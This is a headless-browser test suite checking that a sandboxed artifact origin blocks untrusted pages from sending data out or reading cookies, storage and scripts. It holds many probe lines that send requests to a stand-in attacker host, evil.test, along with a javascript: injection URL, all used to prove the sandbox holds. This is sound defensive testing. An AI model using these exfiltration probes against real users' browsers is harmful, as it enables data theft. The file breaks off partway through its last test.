// Crow Artifacts — origin isolation in a real headless browser (spec §5.1, §13;
// review matrix E1–E16). The REAL artifact-origin handler and the REAL trusted
// viewer (bundles/artifacts/panel/static/viewer.js) run against fake hostnames
// mapped to one loopback test server with --host-resolver-rules:
//   dash.test  — the dashboard (sets crow_session / crow_csrf like auth.js)
//   art.test   — the artifact origin on its own hostname (D13)
//   evil.test  — an attacker; every request it receives is recorded
// The fallback layout (artifact origin on a second port of the dashboard's
// host) is exercised on a second listener at dash.test:<port2>.
//
// Asserted BLOCKED: fetch, XHR, WebSocket, EventSource, sendBeacon, img,
// prefetch, CSS, nested frames, form posts, popups, top navigation, cookies,
// storage, workers (URL and blob), eval / new Function / string timers,
// script and meta-refresh in script-free types, top-level loads as opaque.
// Documented RESIDUALS (not claimed blocked): self-navigation and WebRTC in
// scripted types — the test proves the tripwire fires for self-navigation.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { readFileSync } from "node:fs";
import { startHeadlessChrome } from "./fixtures/headless-chrome.mjs";
import { createArtifactOriginHandler } from "../servers/gateway/artifact-origin/server.js";
import { createViewTokenStore, loadDecision } from "../servers/gateway/artifact-origin/view-tokens.js";
import { iframeSandboxFor, isScriptedType, effectiveType, frameGrantFor, viewerCsp } from "../servers/gateway/artifact-origin/policy.js";
import net from "node:net";

const VIEWER_JS = readFileSync(new URL("../bundles/artifacts/panel/static/viewer.js", import.meta.url), "utf8");

let chrome, server, server2, server4, P, P2, P3, P4, P5, tokens, originMain, originFallback, connServer;
const evidenceAsks = [];   // D24: tokenIds the viewer asked about
let evil2Connections = 0;
const CTL_DOCS = [];   // raw TCP connections to evil2.test (preconnect / dns-prefetch probes)
const evil = [];          // { path, origin }
const rawArtCookies = []; // Cookie header as it ARRIVED at the art.test socket (before the handler strips it)
const CONTENT = new Map(); // artifactId -> { [path]: {body, contentType} }

const html = (s) => ({ body: s, contentType: "text/html; charset=utf-8" });

function probesPage() {
  const E = `http://evil.test:${P}`;
  return html(`<!doctype html><html><head><title>p</title></head><body><a id=l href="#">x</a><script>
(async () => {
  const r = {};
  const tryit = async (k, f) => { try { r[k] = String(await f()); } catch (e) { r[k] = "ERR:" + e.name; } };
  await tryit("origin", () => self.origin);
  await tryit("cookie", () => document.cookie);
  await tryit("localStorage", () => localStorage.length);
  await tryit("sessionStorage", () => sessionStorage.length);
  await tryit("indexedDB", () => new Promise((ok, no) => { const q = indexedDB.open("x"); q.onsuccess = () => ok("opened"); q.onerror = () => no(q.error); }));
  await tryit("fetch", () => fetch("${E}/fetch").then(() => "sent"));
  await tryit("xhr", () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open("GET", "${E}/xhr"); x.onload = () => ok("loaded"); x.onerror = () => no(new Error("xhr")); x.send(); }));
  await tryit("ws", () => new Promise((ok, no) => { const w = new WebSocket("ws://evil.test:${P}/ws"); w.onopen = () => ok("open"); w.onerror = () => no(new Error("ws")); }));
  await tryit("eventsource", () => new Promise((ok, no) => { const s = new EventSource("${E}/es"); s.onopen = () => ok("open"); s.onerror = () => { s.close(); no(new Error("es")); }; }));
  await tryit("beacon", () => navigator.sendBeacon("${E}/beacon", "x"));
  await tryit("img", () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok("loaded"); i.onerror = () => no(new Error("img")); i.src = "${E}/img"; }));
  await tryit("prefetch", () => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = "${E}/prefetch"; document.head.append(l); return "added"; });
  await tryit("css", () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "${E}/css"; document.head.append(l); return "added"; });
  await tryit("subframe", () => { const f = document.createElement("iframe"); f.src = "${E}/subframe"; document.body.append(f); return "added"; });
  await tryit("form", () => { const f = document.createElement("form"); f.method = "POST"; f.action = "${E}/form"; document.body.append(f); f.submit(); return "submitted"; });
  await tryit("open", () => { const w = window.open("${E}/popup"); return w ? "window" : "null"; });
  await tryit("top", () => { top.location = "${E}/top"; return "assigned"; });
  await tryit("worker", () => { new Worker("w.js"); return "constructed"; });
  // A blob Worker constructs without throwing; CSP (worker-src 'none') then
  // refuses to run its script, so "ran" must never come back.
  await tryit("blobworker", () => new Promise((ok, no) => {
    const w = new Worker(URL.createObjectURL(new Blob(["postMessage('ran'); fetch('${E}/blobworker')"], { type: "text/javascript" })));
    w.onmessage = (e) => ok(String(e.data)); w.onerror = () => no(new Error("blocked")); setTimeout(() => ok("no-run"), 1000);
  }));
  await tryit("eval", () => eval("1+1"));
  await tryit("function", () => new Function("return 2")());
  await tryit("rtc", async () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:evil.test:3478" }] });
    pc.createDataChannel("x");
    const cands = [];
    pc.onicecandidate = (e) => { if (e.candidate) cands.push(e.candidate.type); };
    await pc.setLocalDescription(await pc.createOffer());
    await new Promise((ok) => setTimeout(ok, 1500));
    pc.close();
    return "gathered:" + cands.length;
  });
  setTimeout("window.__strTimer = 1", 0);
  await new Promise((ok) => setTimeout(ok, 50));
  r.strTimer = String(!!window.__strTimer);
  parent.postMessage({ t: "probe-result", r }, "*");
})();
</script></body></html>`);
}

before(async () => {
  tokens = createViewTokenStore();
  const resolveContent = async ({ artifactId, path }) => (CONTENT.get(artifactId) || {})[path] || null;
  const handler = (req, res) => {
    const host = String(req.headers.host || "").split(":")[0];
    if (host === "evil.test") {
      evil.push({ path: req.url, origin: req.headers.origin || null, cookie: req.headers.cookie || null });
      if (req.url.startsWith("/nav204")) { res.writeHead(204); return res.end(); }
      // R-H3 pins: a navigation whose response never finishes fires no load.
      if (req.url.startsWith("/hang-silent")) { res.writeHead(200, { "content-type": "text/html" }); res.write("<p>" + " ".repeat(2048)); return; }
      if (req.url.startsWith("/hang-talks")) { res.writeHead(200, { "content-type": "text/html" }); res.write("<script>parent.postMessage({t:'crow-artifact',kind:'hello',nonce:'guess'},'*')</script>" + " ".repeat(2048)); return; }
      res.writeHead(200, { "content-type": "text/html" });
      // E8: the page a navigated frame lands on posts a fake helper hello.
      return res.end(`<script>parent.postMessage({t:"crow-artifact",kind:"hello",nonce:"guess"},"*")</script>evil`);
    }
    if (host === "art.test") { rawArtCookies.push(req.headers.cookie || null); return originMain(req, res); }
    if (host === "ctl.test" && req.url.startsWith("/doc?i=")) {
      res.writeHead(200, { "content-type": "text/html" });   // NO CSP: the per-document positive control
      return res.end(CTL_DOCS[Number(new URL(req.url, "http://x").searchParams.get("i"))] || "");
    }
    if (host === "ctl.test") {
      if (req.url === "/sw.js") { res.writeHead(200, { "content-type": "text/javascript" }); return res.end("self.addEventListener('fetch', () => {});"); }
      res.writeHead(200, { "content-type": "text/html" });   // NO CSP, NO sandbox: the positive control
      return res.end(CHANNEL_PROBES_HTML(`http://evil2.test:${P3}`, "/sw.js"));
    }
    if (host === "dash.test") {
      if (req.url === "/login") {
        res.writeHead(200, { "set-cookie": ["crow_session=SECRET; HttpOnly; SameSite=Lax; Path=/", "crow_csrf=CSRFVALUE; SameSite=Lax; Path=/"], "content-type": "text/plain" });
        return res.end("ok");
      }
      // D24: the owner's load-evidence route, reduced to its decision.
      if (req.url.startsWith("/evidence?")) {
        const id = new URL(req.url, "http://x").searchParams.get("tokenId") || "";
        evidenceAsks.push(id);
        res.writeHead(200, { "content-type": "application/json" });
        return res.end(JSON.stringify(loadDecision(tokens.evidence(id))));
      }
      if (req.url.startsWith("/evidence500")) { res.writeHead(500); return res.end("x"); }
      if (req.url === "/viewer.js") { res.writeHead(200, { "content-type": "text/javascript" }); return res.end(VIEWER_JS); }
      if (req.url.startsWith("/harness")) {
        // The REAL viewer-page CSP (viewerCsp) unless a test asks for the
        // permissive positive control ("open": frame-src allows any http:, the
        // shape of the old global CSP, so the canary still fires on https).
        const q = new URL(req.url, "http://x").searchParams;
        const fs = q.get("fs") || "";
        // (CSP3: a scheme source `http:` also matches https:, so the control
        // names hosts explicitly — the .invalid canary must still be blocked.)
        const csp = q.get("mode") === "open"
          ? `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; frame-src 'self' ${fs} http://evil.test:${P}`
          : q.get("mode") === "global"
            ? "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; frame-src 'self' https: http:"
            : viewerCsp(fs);
        res.writeHead(200, { "content-type": "text/html", "content-security-policy": csp });
        return res.end(`<!doctype html><body style="margin:0"><div id=c style="width:800px;height:600px"></div>
<script src="/viewer.js"></script><script>
window.__r = { trips: [], proposals: [], ready: 0, raw: [], refused: [], minted: 0 };
addEventListener("message", (e) => window.__r.raw.push(e.data));
window.__r.retries = []; window.__r.mintArgs = [];
// D24 test seam: swallow the helper's hello before the viewer sees it — the
// helper WAS served, so the server's record says "parsed".
addEventListener("message", (e) => { if (window.__dropHello && e.data && e.data.kind === "hello") e.stopImmediatePropagation(); }, true);
window.__r.rects = [];
window.__mountWith = (g, o) => { o = o || {}; window.__v = CrowArtifactViewer.mount({ container: c, mint: (f, x) => { __r.minted++; __r.mintArgs.push(x || null); return g; },
  onRects: (r) => __r.rects.push(r),
  helloMs: o.helloMs, loadMs: o.loadMs, loadEvidence: o.evidence === "none" ? undefined : (id) => fetch((o.evidence === "500" ? "/evidence500?" : "/evidence?") + "tokenId=" + encodeURIComponent(id)).then((r) => { if (!r.ok) throw new Error("http " + r.status); return r.json(); }),
  onRetry: (x) => __r.retries.push(x),
  onProposal: (a) => __r.proposals.push(a), onTrip: (x) => __r.trips.push(x), onReady: () => __r.ready++, onRefuse: (x) => __r.refused.push(x) }); return __v.load().then(() => true, (e) => e.message); };
</script></body>`);
      }
    }
    res.writeHead(404); res.end();
  };
  server = http.createServer(handler);
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  P = server.address().port;
  // Explicit fallback bases (review L3): the origin's CSP source base is fixed,
  // never derived from the request's Host header.
  originMain = createArtifactOriginHandler({ tokens, resolveContent, publicBase: null, fallbackBase: `http://art.test:${P}` });
  // Fallback layout: the origin on a second port of the dashboard's host.
  server2 = http.createServer((req, res) => { rawArtCookies.push(req.headers.cookie || null); originFallback(req, res); });
  await new Promise((r) => server2.listen(0, "127.0.0.1", r));
  P2 = server2.address().port;
  originFallback = createArtifactOriginHandler({ tokens, resolveContent, publicBase: null, fallbackBase: `http://dash.test:${P2}` });
  // D24: an origin whose connection dies right after the doctype — the
  // document was served (and the helper injected), but the bytes carrying
  // the helper tag never reach the parser.
  server4 = http.createServer((req, res) => originMain(req, {
    writeHead: (st, h) => res.writeHead(st, { ...h, "content-length": "100000" }),
    end: (buf) => { if (buf) res.write(Buffer.from(buf).subarray(0, 15)); setTimeout(() => res.socket?.destroy(), 30); },
  }));
  await new Promise((r) => server4.listen(0, "127.0.0.1", r));
  P4 = server4.address().port;
  // D24: a port with nothing listening (connection refused).
  { const tmp = net.createServer(); await new Promise((r) => tmp.listen(0, "127.0.0.1", r)); P5 = tmp.address().port; await new Promise((r) => tmp.close(r)); }
  connServer = net.createServer((sock) => { evil2Connections++; sock.destroy(); });
  await new Promise((r) => connServer.listen(0, "127.0.0.1", r));
  P3 = connServer.address().port;
  // Service workers need a secure context: treat the two test origins as secure
  // so the SW probe has a working positive control (re-check R2-L7).
  chrome = await startHeadlessChrome({ extraArgs: [
    "--host-resolver-rules=MAP dash.test 127.0.0.1, MAP art.test 127.0.0.1, MAP evil.test 127.0.0.1, MAP evil2.test 127.0.0.1, MAP ctl.test 127.0.0.1",
    `--unsafely-treat-insecure-origin-as-secure=http://art.test:${P},http://ctl.test:${P}`,
  ] });
});

after(async () => { server?.closeAllConnections?.(); server?.close(); server2?.close(); server4?.closeAllConnections?.(); server4?.close(); connServer?.close(); if (chrome) await chrome.close(); });

async function tab() {
  const t = await (await fetch(chrome.cdp + "/json/new?about:blank", { method: "PUT" })).json();
  const { default: WebSocket } = await import("ws");
  const ws = new WebSocket(t.webSocketDebuggerUrl);
  await new Promise((r, j) => { ws.once("open", r); ws.once("error", j); });
  let id = 0;
  const send = (method, params = {}) => new Promise((resolve, reject) => {
    const mine = ++id;
    const on = (raw) => { const m = JSON.parse(raw); if (m.id !== mine) return; ws.off("message", on); m.error ? reject(new Error(JSON.stringify(m.error))) : resolve(m.result || {}); };
    ws.on("message", on);
    ws.send(JSON.stringify({ id: mine, method, params }));
  });
  const evalIn = async (expression) => {
    const out = await send("Runtime.evaluate", { expression, returnByValue: true, awaitPromise: true });
    if (out.exceptionDetails) return { threw: out.exceptionDetails.exception?.className || out.exceptionDetails.text };
    return out.result.value;
  };
  await send("Page.enable");
  const nav = async (url) => { await send("Page.navigate", { url }); await waitFor(async () => (await evalIn("document.readyState")) === "complete"); };
  return { send, evalIn, nav, close: async () => { ws.close(); await fetch(chrome.cdp + "/json/close/" + t.id).catch(() => {}); } };
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function waitFor(fn, ms = 10000) { const end = Date.now() + ms; while (Date.now() < end) { let v; try { v = await fn(); } catch {} if (v) return v; await sleep(80); } return null; }

let seq = 0;
function grantFor(type, files, { originBase = `http://art.test:${P}`, dashboardOrigin = `http://dash.test:${P}`, scriptsOff = false } = {}) {
  const artifactId = "art-" + (++seq);
  CONTENT.set(artifactId, files);
  const { token, tokenId, nonce } = tokens.mint({ artifactId, versionN: 1, type, dashboardOrigin, scriptsOff });
  // D28/review H2: the same one decision the view-mint route uses.
  const fg = frameGrantFor(type, scriptsOff);
  return { url: `${originBase}/v/${token}/`, token, tokenId, nonce, sandbox: fg.sandbox, scripted: fg.speaks, type };
}

async function harness(t, g, { mode = "narrow", mount = null, before = "" } = {}) {
  await t.nav(`http://dash.test:${P}/login`);
  await t.nav(`http://dash.test:${P}/harness?mode=${mode}&fs=${encodeURIComponent(new URL(g.url).origin)}`);
  if (before) await t.evalIn(before);
  await t.evalIn(`__mountWith(${JSON.stringify(g)}, ${JSON.stringify(mount || { evidence: "none" })})`);
}



test("scripted page: every egress and ambient-authority probe is blocked; self-navigation and WebRTC are the documented residuals", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", { "index.html": probesPage() });
    const before = evil.length;
    await harness(t, g);
    const res = await waitFor(() => t.evalIn(`(__r.raw.find(m => m && m.t === "probe-result") || {}).r`), 15000);
    assert.ok(res, "probe page reported");
    await sleep(500);
    const hits = evil.slice(before).map((e) => e.path);
    assert.equal(res.origin, "null", "opaque origin (E3)");
    assert.match(res.cookie, /^ERR:SecurityError/, "no cookie access (E3)");
    assert.match(res.localStorage, /^ERR:SecurityError/);
    assert.match(res.sessionStorage, /^ERR:SecurityError/);
    assert.match(res.indexedDB, /^ERR:/);
    for (const k of ["fetch", "xhr", "ws", "eventsource", "img"]) assert.match(res[k], /^ERR:/, `${k} blocked (E4)`);
    // sendBeacon returns true (queued) even when CSP then refuses the send; the
    // proof that nothing left is the empty evil.test hit list below.
    assert.equal(res.open, "null", "window.open blocked (E5)");
    assert.match(res.top, /^ERR:/, "top navigation blocked (E6)");
    assert.match(res.worker, /^ERR:SecurityError/, "same-host worker blocked (E10)");
    assert.notEqual(res.blobworker, "ran", "blob worker never runs (E11)");
    assert.match(res.eval, /^ERR:EvalError/, "eval blocked (E12)");
    assert.match(res.function, /^ERR:EvalError/, "new Function blocked (E12)");
    assert.equal(res.strTimer, "false", "string timers blocked");
    const leaked = hits.filter((p) => !p.startsWith("/selfnav"));
    assert.deepEqual(leaked, [], "no request reached evil.test (fetch/xhr/ws/es/beacon/img/prefetch/css/subframe/form/popup/top)");
    // RESIDUAL (documented, spec §5.1): WebRTC ICE gathering runs under connect-src 'none' (E9).
    console.log(`[artifact-isolation] residuals on this Chrome: webrtc=${res.rtc} blobworker=${res.blobworker}`);
    const st = await t.evalIn("__v.state()");
    assert.equal(st.tripped, false, "an obedient page does not trip the wire");
    assert.equal(st.hello, true);
    // R3: the mounted frame itself carries the grant's sandbox attribute, plus
    // no-referrer and an empty permissions allowlist (the CSP header alone must
    // not be the only frame-side control).
    const attrs = await t.evalIn(`(() => { const f = document.querySelector('iframe.crow-artifact-frame'); return f && { sandbox: f.getAttribute('sandbox'), rp: f.getAttribute('referrerpolicy'), allow: f.getAttribute('allow') }; })()`);
    assert.deepEqual(attrs, { sandbox: g.sandbox, rp: "no-referrer", allow: "" }, "iframe sandbox/referrerpolicy/allow (R3)");
  } finally { await t.close(); }
});

test("own hostname (D13): the dashboard's cookies never reach the artifact origin (E1 fixed)", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    rawArtCookies.length = 0;
    const g = grantFor("document", { "index.html": html("<p>hello</p>") });
    await harness(t, g);
    await waitFor(() => t.evalIn("__r.ready"));
    assert.ok(rawArtCookies.length >= 1);
    assert.deepEqual(rawArtCookies.filter(Boolean), [], "no Cookie header arrived at art.test");
  } finally { await t.close(); }
});

test("fallback layout (second port, same host): cookies arrive at the socket — so stripping and the sandbox header are what protect it (E1/E13/E14)", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    rawArtCookies.length = 0;
    const g = grantFor("page", { "index.html": html("<p id=x>hi</p>") }, { originBase: `http://dash.test:${P2}` });
    await harness(t, g);
    await waitFor(() => t.evalIn("__r.ready"));
    assert.ok(rawArtCookies.some((c) => c && c.includes("crow_session=SECRET")), "the browser DOES send the cookies on the fallback (that is E1)");
    // Top-level loads of every route and error path on the fallback listener:
    const bad = "x".repeat(43);
    for (const url of [g.url, `http://dash.test:${P2}/`, `http://dash.test:${P2}/v/${bad}/`, `${g.url}missing.css`, `${g.url}../x`]) {
      await t.nav(url);
      assert.equal(await t.evalIn("self.origin"), "null", `top-level ${url} runs as an opaque origin (E14)`);
      const c = await t.evalIn("document.cookie");
      assert.ok(c && c.threw === "DOMException", `top-level ${url}: crow_csrf unreadable (E13 fixed) — got ${JSON.stringify(c)}`);
    }
  } finally { await t.close(); }
});

test("sealed (a scripts-off page, D20/D28): no script runs, meta refresh and every subresource to another origin are refused (E16)", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const E = `http://evil.test:${P}`;
    const before = evil.length;
    const g = grantFor("page", { "index.html": html(`<!doctype html><html><head><meta http-equiv="refresh" content="0;url=${E}/meta"><link rel=stylesheet href="${E}/css"><link rel=prefetch href="${E}/prefetch"></head><body>
<script>parent.postMessage({t:"probe-result",r:{ran:true}},"*"); new Image().src="${E}/scriptimg";</script>
<img src="${E}/img"><iframe src="${E}/subframe"></iframe><object data="${E}/object"></object><p style="background:url(${E}/bg)">x</p>
<form action="${E}/form" method=post><button id=b>go</button></form></body></html>`) }, { scriptsOff: true });
    await harness(t, g);
    await waitFor(() => t.evalIn("__r.ready"));
    await sleep(1500);
    const attrs = await t.evalIn(`(() => { const f = document.querySelector('iframe.crow-artifact-frame'); return f && { sandbox: f.getAttribute('sandbox'), rp: f.getAttribute('referrerpolicy'), allow: f.getAttribute('allow') }; })()`);
    assert.deepEqual(attrs, { sandbox: "", rp: "no-referrer", allow: "" }, "script-free frame carries the empty sandbox attribute (R3)");
    assert.equal(await t.evalIn(`__r.raw.some(m => m && m.t === "probe-result")`), false, "no script ran");
    assert.deepEqual(evil.slice(before).map((e) => e.path), [], "nothing reached evil.test");
    const st = await t.evalIn("__v.state()");
    assert.equal(st.loads, 1, "meta refresh did not navigate the frame");
    assert.equal(st.tripped, false);
  } finally { await t.close(); }
});



for (const [label, body, want] of [
  ["a wrong nonce", `parent.postMessage({ t: "crow-artifact", nonce: "wrong", kind: "anchor", anchor: { kind: "element", selector: "p", text: "" } }, "*");`, "bad-nonce"],
  ["an oversized crow-artifact message", `parent.postMessage({ t: "crow-artifact", nonce: "x", kind: "anchor", anchor: { kind: "element", selector: "x".repeat(9000), text: "" } }, "*");`, "oversized"],
  ["a flood (fail closed: never just dropped, so a bad message cannot hide behind the rate cap)", `for (let i = 0; i < 40; i++) parent.postMessage({ t: "noise", i }, "*");`, "flood"],
]) {
  test(`${label} trips the wire and produces no proposal`, async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
    const t = await tab();
    try {
      const g = grantFor("page", { "index.html": html(`<!doctype html><html><head></head><body><script>setTimeout(() => { ${body} }, 300);</script></body></html>`) });
      await harness(t, g);
      const trips = await waitFor(async () => { const x = await t.evalIn("__r.trips"); return x && x.length ? x : null; });
      assert.deepEqual(trips, [want]);
      assert.equal(await t.evalIn("__r.proposals.length"), 0);
      assert.equal((await t.evalIn("__v.state()")).framed, false, "frame torn down");
    } finally { await t.close(); }
  });
}

test("a trip is terminal: reload() refuses and no new frame appears (no fail-open re-arm)", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", { "index.html": html(`<!doctype html><html><head></head><body><script>setTimeout(() => { location.href = "http://evil.test:${P}/again"; }, 200)</script></body></html>`) });
    await harness(t, g);
    await waitFor(async () => (await t.evalIn("__r.trips")).length);
    const r = await t.evalIn("__v.reload().then(() => 'reloaded', (e) => e.message)");
    assert.equal(r, "tripped");
    assert.equal(await t.evalIn("document.querySelectorAll('iframe').length"), 0);
    assert.equal(await t.evalIn("__v.state().tripped"), true);
  } finally { await t.close(); }
});

test("the viewer refuses grants that would weaken the frame (bad sandbox, bad URL, same origin as the dashboard)", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    await harness(t, grantFor("document", { "index.html": html("<p>ok</p>") }));
    const good = grantFor("page", { "index.html": html("<p>ok</p>") });
    const bads = [
      { ...good, sandbox: "allow-scripts allow-same-origin" },
      { ...good, sandbox: "allow-scripts allow-top-navigation" },
      { ...good, sandbox: "", scripted: true },
      { ...good, url: "about:blank" },
      { ...good, url: "javascript:parent.__pwned=1" },
      { ...good, url: "data:text/html,<p>x" },
      { ...good, url: `http://dash.test:${P}/v/${good.token}/` },
      { ...good, url: good.url + "x/../" },
      { ...good, nonce: "" },
    ];
    for (const b of bads) {
      // D28/review H2: refused LOCALLY (onRefuse) — never framed, never a trip/flag.
      // D28 low: the refused grant's minted token is handed back for revocation.
      const out = await t.evalIn(`(() => { const r = { trips: [], refused: [], revoked: [] }; const v = CrowArtifactViewer.mount({ container: c, mint: () => (${JSON.stringify(b)}), onTrip: (x) => r.trips.push(x), onRefuse: (x) => r.refused.push(x), revoke: (id) => r.revoked.push(id) });
        return v.load().then(() => "mounted", (e) => e.message + "|" + r.trips.join(",") + "|" + r.refused.join(",") + "|" + v.state().framed + "|" + r.revoked.join(",")); })()`);
      assert.equal(out, "bad-grant||bad-grant|false|" + b.tokenId, JSON.stringify(b).slice(0, 120));
    }
    assert.equal(await t.evalIn("window.__pwned"), undefined);
  } finally { await t.close(); }
});
test("comment mode: a click inside a scripted page becomes ONE validated element proposal; the content's own handler does not run", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", { "index.html": html(`<!doctype html><html><head><style>body{margin:0}button{position:absolute;left:20px;top:20px;width:200px;height:60px}</style></head><body><button id=buy onclick="parent.postMessage({t:'probe-result',r:{clicked:true}},'*')">Buy now</button></body></html>`) });
    await harness(t, g);
    await waitFor(() => t.evalIn("__r.ready"));
    await t.evalIn("__v.setCommentMode(true)");
    await sleep(200);
    for (const type of ["mousePressed", "mouseReleased"]) await t.send("Input.dispatchMouseEvent", { type, x: 60, y: 40, button: "left", clickCount: 1 });
    const props = await waitFor(async () => { const x = await t.evalIn("__r.proposals"); return x && x.length ? x : null; });
    assert.deepEqual(props, [{ kind: "element", selector: "#buy", text: "Buy now" }]);
    assert.equal(await t.evalIn(`__r.raw.some(m => m && m.t === "probe-result")`), false, "comment mode swallowed the content's click");
    await t.evalIn("__v.setCommentMode(false)");
    await sleep(200);
    for (const type of ["mousePressed", "mouseReleased"]) await t.send("Input.dispatchMouseEvent", { type, x: 60, y: 40, button: "left", clickCount: 1 });
    assert.ok(await waitFor(() => t.evalIn(`__r.raw.some(m => m && m.t === "probe-result")`)), "with comment mode off the content's own button works (mobile toggle, spec §5.3)");
  } finally { await t.close(); }
});

test("script-free: showBlock mounts a fresh frame (no load is ever excused), and a link clicked afterwards still trips", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const E = `http://evil.test:${P}`;
    const g = grantFor("document", { "index.html": html(`<!doctype html><html><head><style>body{margin:0}a{display:block;width:300px;height:50px}p{height:2000px;margin:0}</style></head><body><div id=b1><a href="${E}/afterjump">a link</a></div><p id=b2>two</p></body></html>`) });
    await harness(t, g);
    await waitFor(() => t.evalIn("__r.ready"));
    await t.evalIn("__v.showBlock('b2')");
    await sleep(500);
    await t.evalIn("__v.showBlock('b1')");
    await sleep(500);
    const st = await t.evalIn("__v.state()");
    assert.equal(st.loads, 1, "each jump is a fresh frame's first load");
    assert.equal(st.tripped, false);
    for (const type of ["mousePressed", "mouseReleased"]) await t.send("Input.dispatchMouseEvent", { type, x: 20, y: 20, button: "left", clickCount: 1 });
    const trips = await waitFor(async () => { const x = await t.evalIn("__r.trips"); return x && x.length ? x : null; });
    assert.deepEqual(trips, ["second-load"], "a navigation after a jump is still caught");
  } finally { await t.close(); }
});


const GIF = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
const PNG_B64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
/** The image / service-worker / preconnect probes, as one page; run once with no
 *  protection (ctl.test, the positive control) and once as an artifact. */
function CHANNEL_PROBES_HTML(E2, swUrl) {
  return `<!doctype html><html><head><link rel="dns-prefetch" href="${E2}/"><link rel="preconnect" href="${E2}/"></head><body><script>
(async () => {
  const r = {};
  const bounded = (p) => Promise.race([p, new Promise((ok) => setTimeout(() => ok("timeout"), 1500))]);
  const tryit = async (k, f) => { try { r[k] = String(await bounded(Promise.resolve().then(f))); } catch (e) { r[k] = "ERR:" + e.name; } };
  await tryit("dataImg", () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok("loaded"); i.onerror = () => no(new Error("blocked")); i.src = "${GIF}"; }));
  await tryit("blobImg", () => new Promise((ok, no) => { const b = Uint8Array.from(atob("${PNG_B64}"), (c) => c.charCodeAt(0)); const i = new Image(); i.onload = () => ok("loaded"); i.onerror = () => no(new Error("blocked")); i.src = URL.createObjectURL(new Blob([b], { type: "image/png" })); }));
  await tryit("sw", () => navigator.serviceWorker ? navigator.serviceWorker.register("${swUrl}").then(() => "registered") : "no-api");
  await new Promise((ok) => setTimeout(ok, 800));
  (window.parent !== window ? parent : window).postMessage({ t: "probe-result", r }, "*");
  window.__probe = r;
})();
<\/script></body></html>`;
}
let CONTROL = null;   // results of the unprotected positive control

test("positive controls (re-check R2-L7): with NO CSP and NO sandbox the image probes DO succeed (service worker / preconnect recorded as testable or not)", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const conns = evil2Connections;
    await t.nav(`http://ctl.test:${P}/`);
    const r = await waitFor(() => t.evalIn("window.__probe"), 8000);
    await sleep(500);
    CONTROL = { ...r, preconnect: evil2Connections > conns };
    console.log(`[artifact-isolation] positive control: ${JSON.stringify(CONTROL)}`);
    assert.equal(r.dataImg, "loaded", "a valid data: GIF loads without CSP");
    assert.equal(r.blobImg, "loaded", "a valid blob: PNG loads without CSP");
    // Service workers and preconnect: the control decides whether the sealed
    // probe means anything. On Chrome Headless Shell 1228 neither works even
    // unprotected (navigator.serviceWorker is absent even on a secure-treated
    // origin; preconnect opens no socket), so both are logged UNTESTABLE and the
    // sealed-frame test only asserts them where the control succeeded.
    if (r.sw !== "registered") console.log(`[artifact-isolation] service worker: UNTESTABLE on this Chrome (control: ${r.sw})`);
  } finally { await t.close(); }
});

test("more channels (plan review): <a ping>, form target, @font-face, @import, preload/poster/media/embed/object, data: frames — blocked; images, service worker and preconnect only where the positive control proved the probe live", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const E = `http://evil.test:${P}`, E2 = `http://evil2.test:${P3}`;
    const before = evil.length, conns = evil2Connections;
    const g = grantFor("page", { "index.html": html(`<!doctype html><html><head>
<style>@import url("${E}/import.css"); @font-face { font-family: X; src: url("${E}/font.woff2"); } body { font-family: X; }</style>
<link rel="preload" as="image" href="${E}/preload.png">
</head><body>font probe<a id=p href="#here" ping="${E}/ping">ping</a>
<form id=f action="${E}/form-target" method=post target="_blank"><input name=a value=1></form>
<video poster="${E}/poster.png" src="${E}/video.mp4"></video><audio src="${E}/audio.mp3"></audio><embed src="${E}/embed"><object data="${E}/object"></object>
<script>
document.getElementById("p").click();
document.getElementById("f").submit();
const f = document.createElement("iframe"); f.src = "data:text/html," + encodeURIComponent("<scr" + "ipt>top.postMessage('x','*')</scr" + "ipt>"); document.body.append(f);
window.__open = window.open("${E}/popup2");
setTimeout(() => parent.postMessage({ t: "early-done", open: window.__open ? "window" : "null" }, "*"), 600);
</script></body></html>`) });
    await harness(t, g);
    assert.ok(await waitFor(() => t.evalIn(`__r.raw.some(m => m && m.t === "early-done")`), 10000));
    await sleep(600);
    assert.deepEqual(evil.slice(before).map((e) => e.path), [], "nothing reached evil.test (ping, form target, @import, @font-face, preload, poster, media, embed, object, popup)");
    assert.equal(await t.evalIn(`__r.raw.find(m => m && m.t === "early-done").open`), "null");
    assert.equal(await t.evalIn("__r.raw.includes('x')"), false, "a data: frame never ran (frame-src 'none')");
    assert.equal((await t.evalIn("__v.state()")).tripped, false, "a fragment link with ping is not a navigation");

    // The second half reuses the control page's probes inside the sealed frame.
